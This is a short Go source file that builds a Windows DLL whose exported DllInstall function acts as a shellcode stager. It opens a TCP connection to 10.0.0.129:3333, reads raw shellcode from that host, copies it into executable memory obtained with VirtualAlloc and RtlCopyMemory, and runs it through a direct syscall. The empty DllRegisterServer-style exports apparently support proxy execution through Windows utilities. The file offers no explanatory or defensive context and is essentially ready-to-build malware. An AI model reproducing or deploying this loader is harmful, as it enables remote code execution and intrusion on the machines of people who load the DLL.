package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

//export EntryPoint
func EntryPoint() {
}

//export DllRegisterServer
func DllRegisterServer() {
}

//export DllUnregisterServer
func DllUnregisterServer() {
}

//export DllInstall
func DllInstall() {
	sc := []byte{}

	conn, err := net.Dial("tcp", "10.0.0.129:3333")
	defer conn.Close()
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	sc, _ = ioutil.ReadAll(conn)

	shellCodeRTLCopyMemory(sc)
}

func shellCodeRTLCopyMemory(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Println(err.Error())
		return
	}

	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	_, _, err = syscall.Syscall(addr, 0, 0, 0, 0)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
}

func main() {
}
